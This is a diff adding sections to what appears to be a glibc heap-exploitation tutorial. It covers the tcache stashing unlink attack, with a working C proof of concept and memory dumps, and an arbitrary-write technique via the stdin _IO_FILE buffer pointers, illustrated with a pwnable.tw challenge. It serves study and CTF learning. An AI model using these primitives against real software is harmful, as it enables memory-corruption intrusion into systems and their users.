@@ -726,6 +726,7 @@ And the memory dump :
 	Better make this with spread to pinch valid chunk beetween victims and probably according a programm logic
 	with a next allocation you can fill that area as whole chunk to overwrite fd & bk of pinched chunk to trigger fastbin/tcache poisoning.
 	Or you can get uaf primitive because 1st victim still not freed for allocator and it opens a way to unsorted bin attack, for example.
+	Or just leak main arena address if upper chunk available for reading.
 	
 4.8 Large bin attack
 ------------------------------------------------------------------------------
@@ -1087,6 +1088,136 @@ glibc >= 2.30 :
 			
 	But... Block "if" doesn't include these macros. It actually means that we can just do tail insertion technique from 4.2. ;)
 
+4.9 Tcache stashing unlink attack (glibc >= 2.26)
+------------------------------------------------------------------------------
+
+Concept of this technique is getting arbitrary malloc via overwrite bk pointer of the pre-last freed chunk at smallbin.
+It means that allocator tries to stash chunks from smallbin to the tcache to optimize heap (fast tcache vs slow main arena bins).
+And when it reaches victim chunk with overwritten bk it tries to pull chunk at this address too.
+Finally, that address will be pushed into tcache bin and the next allocation will return that address.
+
+p.s. I'll show you method with malloc() only. 
+Exists easily method with calloc() - when you do calloc() allocator doesn't look at the tcache and go to main arena bins immediately.
+Technique doesn't have hard divergence between that which we consider here. 
+Just look : https://github.com/shellphish/how2heap/blob/master/glibc_2.40/tcache_stashing_unlink_attack.c
+
+This is my PoC :
+
+	#include <stdlib.h>
+
+	int main() {
+		long* chunks[14] = {0};
+		long t = <target address - 0x10>;
+
+		for (int i = 0; i < 14; ++i) {
+		        if (i >= 8) malloc(0x10);	// layers to bypass unsorted chunks consolidation
+		        chunks[i] = malloc(0x80);
+		}
+
+		malloc(0x10);				// and the last layer
+
+		*(long*)(t + 0x18) = t + 0x10;		// target->bk must be writeable address
+
+		for (int i = 0; i < 14; ++i) {		// fill tcache & unsorted chunks
+		        free(chunks[i]);
+		}
+
+		malloc(0x90);				// move chunks from unsorted chunks to smallbin
+
+		for (int i = 0; i < 7; ++i) {		// erase tcache bin
+		        chunks[i] = malloc(0x80);
+		}
+
+		/* VULN */
+		chunks[13][1] = t;			
+
+		malloc(0x80);				// get a head of smallbin & trigger stashing
+
+		long* a = malloc(0x80);			// a is the target address
+		*a = 0xdeadbeef;
+	}
+	
+Let's check it out :
+
+	When we try to allocate memory first of all allocator looks at the tcache, next fastbin, then main arena bins.
+	It means, that tcache, fastbin haven't chunks with approptiate size it will look at small/large/unsorted bins.
+	And first of all we must do heap grooming to put 7 chunks to the smallbin.
+	Next - erase whole tcache bin and overwrite bk of the pre-last freed chunk.
+	Important thing - allocator link freed chunks to the head of smallbin and does traversal from the tail.
+	It means that if we allocate and free to smallbin chunks "c1 - c7", smallbin will look like :
+	
+		bin <-> c7 <-> c6 <-> c5 <-> c4 <-> c3 <-> c2 <-> c1 <-> bin
+	   
+	Then we try to allocate chunk, the head of smallbin will be returned. 
+	And this is a statement of smallbin : 
+	
+		bin <-> c6 <-> c5 <-> c4 <-> c3 <-> c2 <-> c1 <-> bin
+		
+	Now, allocator executes this pseudo-code :
+	
+		while (tcache->counts[tc_idx] < mp_.tcache_count && (current = last (bin)) != bin) { 	<== while tcache->counts of current bin less than 7 and chunks in small bin exist
+			if (current) {
+				bck = current->bk;			<== take chunk with bk of the tail - last (bin) returns tail chunk
+				
+				/* logic of "inuse" bit putting */
+				
+				bck->fd = bin;				<== fd of tail is bin address
+				bin->bk = bck;				<== update the tail
+				
+				tcache_put (current, tc_idx);
+			}	
+		}
+		
+	And chunks were pushed to tcache like LIFO.
+	After "c7" bk overwrite (the ring of double linked list was broken):
+	
+		writeable address <-> fake chunk <-> c6 <-> c5 <-> c4 <-> c3 <-> c2 <-> c1 <-> bin
+		
+	Now chunks c1 - c5 will be stashed to tcache.
+	Let's look at two last iterations :
+	
+		c6 unlink :
+		
+			tcache->counts[tc_idx] == 5 and (victim = last (bin)) != bin 	<== ok!
+			bck = victim->bk 						<== bck is fake chunk
+			bck->fd = bin							<== put bin address just like new tail
+			bin->bk = bck							<== now tail of the bin is out fake chunk
+			
+	Fine, nowhere issues.
+	
+		fake chunk unlink :
+		
+			tcache->counts[tc_idx] == 6 and (victim = last (bin)) != bin 	<== still ok!
+			bck = victim->bk 						<== bck is writeable address
+			bck->fd = bin							<== put bin address also like new tail
+			bin->bk = bck							<== and now tail is writeable address
+			
+	After fake chunk stashing, tcache->counts[tc_idx] == 7 ==> go out from loop.
+	And out fake chunk situated at the "top" of tcache bin.
+	
+Let's check memory at two last iterations :
+
+	After c6 unlink (0x000055555555b100 is a target - 0x10):	0x7ffff7dfed90: 0x000055555555baa0      0x000055555555b100
+	And after fake chunk unlink :					0x7ffff7dfed90: 0x000055555555baa0      0x000055555555b110
+	
+	Tcache :
+	
+		0x55555555b000: 0x0000000000000000      0x0000000000000291
+		0x55555555b010: 0x0000000000000000      0x0007000000000000
+					...
+		0x55555555b0c0: 0x0000000000000000      0x000055555555b110
+		
+	And after the last allocation :
+
+		0x55555555b110: 0x00000000deadbeef      0x0000000000000000
+		0x55555555b120: 0x00007ffff7dfed80      0x0000000000000000
+		
+	As you can see it works.
+	
+If you buid fully-valid double linked list at control to write memory space you potentially can do 6 arbitrary allocations ;)
+(trigger stashing when smallbin uncludes 2 chunks and bk will be valid for each evil chunk traversal).
+You can also use it to leak main arena address with bck->fd = bin.
+
 
 ================================================================================
 5. FILE-STREAM ORIENTED PROGRAMMING
@@ -1348,6 +1479,52 @@ Let me show you an example :
 		    00000010  ff ff ff ff  ff ff ff ff  00 00 00 2a  2a 2a 2a 2a  │····│····│···*│****│
 		    
 	Well done. And now we can calculate libc base to continue compromise chain.
+	
+5.5 Manipulations with stdin _IO_FILE struct to reach arbitrary write
+------------------------------------------------------------------------------
+
+If you have libc (or another place to write) leak, relevant partial overwrite or another way to modify stdin structure you potentially
+can reach arbitrary write primitive (if you haven't it at the moment or it isn't strong).
+
+It means that if you can control _IO_2_1_stdin_.buf_base & _IO_2_1_stdin_.buf_end your next data
+from input first of all will be stored in range buf_base & buf_end.
+And if you can overwrite them you'll can write at buf_base address <buf_end - buf_base> bytes.
+
+Let's consider an example (WannaHeap from pwnable.tw) :
+
+	Code has vulnerability which gives us a way to arbitrary put zero byte.
+	It uses first inputed size to put null-byte to input despite of current size :
+	
+		*(undefined1 *)((long)chunk + old_size) = 0;
+		
+	So, if we allocated 0x313370 bytes (with mmap pages were put upper the libc),
+	but inputed 0x314000 - 0x10 + libc.sym['_IO_2_1_stdin_'] + 56 previously, null byte will be put
+	right to the _IO_2_1_stdin_.buf_base and it becomes point to _IO_2_1_stdin_.buf_end.
+	It means that next use of stdin _IO_FILE (scanf, getchar, fgets etc.) will buffer input to the space
+	between buf_base and buf_base addresses, where buf_base is _IO_2_1_stdin_.buf_end :
+	
+		0x7ffff7bc18c0 <_IO_2_1_stdin_>:        0x00000000fbad208b      0x00007ffff7bc1900
+		0x7ffff7bc18d0 <_IO_2_1_stdin_+16>:     0x00007ffff7bc1900      0x00007ffff7bc1900
+		0x7ffff7bc18e0 <_IO_2_1_stdin_+32>:     0x00007ffff7bc1900      0x00007ffff7bc1900
+		0x7ffff7bc18f0 <_IO_2_1_stdin_+48>:     0x00007ffff7bc1900      0x00007ffff7bc1900	<== we put null byte right here
+		0x7ffff7bc1900 <_IO_2_1_stdin_+64>:     0x00007ffff7bc1944      <== it points right here
+		
+	As you can see, after putting null byte to the 0x7ffff7bc18f8, another fields like read_base, read_end, read_ptr (and write_base/end/ptr)
+	were synchronized and became equal to base_buf.
+	
+	And if we'll put address larger than _IO_2_1_stdout_.buf_end, for example it's address + 0x1000,
+	via stdin _IO_FILE functions, we'll can write data from _IO_2_1_stdin_.buf_end to _IO_2_1_stdin_.buf_end + 0x1000!
+	
+					...
+		0x7ffff7bc18f0 <_IO_2_1_stdin_+48>:     0x00007ffff7bc1900      0x00007ffff7bc1900	<== buf_base
+		0x7ffff7bc1900 <_IO_2_1_stdin_+64>:     0x00007ffff7bc2900      <== buf_end
+					...
+	
+	It means you can control whole data under _IO_2_1_stdin_.buf_end (__malloc_hook/__morecore, main_arena, _IO_list_all etc.)
+	
+Impact of this attack is obvious - arbitrary write. As I wrote at the introducing you also can use this technique to reach stronger primitive,
+for example - when you do fastbin dup at glibc < 2.41 and haven't properly "environment" near the space where you need to be allocated (look unaligned malloc at 6.11),
+or another less reliable write primitive.
 	
 	
 ================================================================================
